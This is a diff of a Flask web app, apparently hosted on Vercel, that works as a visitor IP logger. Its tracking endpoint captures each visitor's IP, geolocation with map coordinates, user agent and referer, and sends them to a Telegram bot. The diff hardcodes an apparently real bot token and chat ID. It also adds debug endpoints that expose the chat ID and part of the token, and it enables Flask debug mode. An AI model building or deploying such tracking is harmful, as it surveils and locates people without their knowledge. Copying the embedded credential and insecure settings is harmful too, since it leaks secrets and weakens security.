@@ -8,16 +8,16 @@ app = Flask(__name__,
             static_folder='../static')
 
 # ============ KONFIGURASI ============
-# Baca dari environment variable
-TELEGRAM_BOT_TOKEN = os.environ.get("8780073514:AAF4WU_A69EitrlCxx155yNxCwwHz41M__s", "")
-TELEGRAM_CHAT_ID = os.environ.get("6446678808", "")
+# 🔴 SEMENTARA: Hardcode untuk testing (JANGAN UNTUK PRODUKSI!)
+TELEGRAM_BOT_TOKEN = "8780073514:AAF4WU_A69EitrlCxx155yNxCwwHz41M__s"  # GANTI SEGERA!
+TELEGRAM_CHAT_ID = "6446678808"
 
 # ============ FUNCTIONS ============
 
 def get_client_ip():
     headers_to_check = [
-        'CF-Connecting-IP',      # Cloudflare
-        'X-Vercel-Forwarded-For', # Vercel
+        'CF-Connecting-IP',
+        'X-Vercel-Forwarded-For',
         'X-Forwarded-For',
         'X-Real-IP',
         'True-Client-IP',
@@ -39,7 +39,7 @@ def get_ip_info(ip):
         response = requests.get(f'{url}?fields={fields}', timeout=10)
         return response.json()
     except Exception as e:
-        return {"status": "error", "message": str(e)}
+        return {"status": "error", "message": str(e), "query": ip}
 
 def send_to_telegram(data):
     if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
@@ -59,50 +59,49 @@ def send_to_telegram(data):
     isp       = safe('isp')
     org       = safe('org')
     timezone  = safe('timezone')
-    timestamp = safe('timestamp')
+    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
     ua        = safe('user_agent', 'Unknown')[:200]
     
     maps_link = ""
-    if lat != 'N/A' and lon != 'N/A':
-        maps_link = f"\n\n🗺 <a href='https://www.google.com/maps?q={lat},{lon}'>Lihat di Google Maps</a>"
+    if lat != 'N/A' and lon != 'N/A' and lat != '' and lon != '':
+        try:
+            float(lat)
+            maps_link = f"\n\n🗺 Google Maps: https://www.google.com/maps?q={lat},{lon}"
+        except:
+            pass
     
-    # Pakai HTML bukan Markdown (lebih stabil)
-    message = f"""🔴 <b>NEW VISITOR</b>
+    # Kirim dengan format sederhana dulu untuk test
+    message = f"""🔴 NEW VISITOR
 
-📅 Waktu: {timestamp}
-🌐 IP: <code>{ip_addr}</code>
-📍 Lokasi: {city}, {region}, {country}
-🗺 Koordinat: {lat}, {lon}
+📅 Time: {timestamp}
+🌐 IP: {ip_addr}
+📍 Location: {city}, {region}, {country}
 📡 ISP: {isp}
-🏢 Org: {org}
 🕐 Timezone: {timezone}
 
-📱 <b>User Agent:</b>
-<code>{ua}</code>{maps_link}"""
+📱 User Agent: {ua}{maps_link}"""
     
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
     payload = {
         'chat_id': TELEGRAM_CHAT_ID,
         'text': message,
-        'parse_mode': 'HTML',
-        'disable_web_page_preview': False
+        'parse_mode': None,  # Pakai None dulu untuk test
+        'disable_web_page_preview': True
     }
     
     try:
+        print(f"[DEBUG] Sending to Telegram...")
         response = requests.post(url, json=payload, timeout=15)
         result = response.json()
+        
+        print(f"[DEBUG] Response: {result}")
         
         if result.get('ok'):
             print("[SUCCESS] Terkirim ke Telegram!")
             return True
         else:
             print(f"[ERROR] Telegram: {result.get('description')}")
-            
-            # Fallback: kirim tanpa parse_mode
-            payload['parse_mode'] = None
-            payload['text'] = f"NEW VISITOR\nIP: {ip_addr}\nLokasi: {city}, {country}\nISP: {isp}\nWaktu: {timestamp}"
-            r2 = requests.post(url, json=payload, timeout=15)
-            return r2.json().get('ok', False)
+            return False
             
     except Exception as e:
         print(f"[ERROR] Exception: {e}")
@@ -120,42 +119,71 @@ def favicon():
 
 @app.route('/api/track', methods=['GET', 'POST'])
 def track():
-    client_ip  = get_client_ip()
+    print("=" * 50)
+    print("TRACKING REQUEST RECEIVED")
+    
+    client_ip = get_client_ip()
     user_agent = request.headers.get('User-Agent', 'Unknown')
-    referer    = request.headers.get('Referer', 'Direct')
+    referer = request.headers.get('Referer', 'Direct')
+    
+    print(f"IP: {client_ip}")
+    print(f"User-Agent: {user_agent}")
     
     ip_info = get_ip_info(client_ip)
     ip_info['user_agent'] = user_agent
-    ip_info['timestamp']  = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    ip_info['timestamp'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
     ip_info['detected_ip'] = client_ip
-    ip_info['referer']    = referer
+    ip_info['referer'] = referer
+    
+    print(f"IP Info status: {ip_info.get('status')}")
     
     telegram_sent = send_to_telegram(ip_info)
     ip_info['telegram_sent'] = telegram_sent
+    
+    print(f"Telegram sent: {telegram_sent}")
+    print("=" * 50)
     
     return jsonify(ip_info)
 
 @app.route('/api/test-telegram', methods=['GET'])
 def test_telegram():
+    """Test endpoint untuk debugging"""
+    print("TEST TELEGRAM ENDPOINT CALLED")
+    
     test_data = {
-        'query'      : '8.8.8.8',
-        'country'    : 'United States',
-        'regionName' : 'California',
-        'city'       : 'Mountain View',
-        'lat'        : '37.4056',
-        'lon'        : '-122.0775',
-        'isp'        : 'Google LLC',
-        'org'        : 'Google Public DNS',
-        'timezone'   : 'America/Los_Angeles',
-        'timestamp'  : datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
-        'user_agent' : 'Test Agent'
+        'query': '8.8.8.8',
+        'country': 'United States',
+        'regionName': 'California',
+        'city': 'Mountain View',
+        'lat': '37.4056',
+        'lon': '-122.0775',
+        'isp': 'Google LLC',
+        'org': 'Google Public DNS',
+        'timezone': 'America/Los_Angeles',
+        'user_agent': 'Test Agent from Vercel'
     }
+    
     sent = send_to_telegram(test_data)
+    
     return jsonify({
-        'test_message_sent' : sent,
-        'token_ada'         : bool(TELEGRAM_BOT_TOKEN),
-        'chat_id_ada'       : bool(TELEGRAM_CHAT_ID),
+        'test_message_sent': sent,
+        'token_ada': bool(TELEGRAM_BOT_TOKEN),
+        'chat_id_ada': bool(TELEGRAM_CHAT_ID),
+        'token_preview': TELEGRAM_BOT_TOKEN[:10] + '...' if TELEGRAM_BOT_TOKEN else 'None',
+        'chat_id': TELEGRAM_CHAT_ID
     })
 
-# Vercel otomatis pakai objek 'app' ini
-# TIDAK perlu fungsi handler()
+@app.route('/api/debug', methods=['GET'])
+def debug():
+    """Endpoint debugging untuk cek konfigurasi"""
+    return jsonify({
+        'telegram_token_set': bool(TELEGRAM_BOT_TOKEN),
+        'telegram_chat_id_set': bool(TELEGRAM_CHAT_ID),
+        'token_length': len(TELEGRAM_BOT_TOKEN) if TELEGRAM_BOT_TOKEN else 0,
+        'chat_id': TELEGRAM_CHAT_ID,
+        'python_version': '3.x'
+    })
+
+# Untuk running lokal
+if __name__ == '__main__':
+    app.run(debug=True, port=5000)
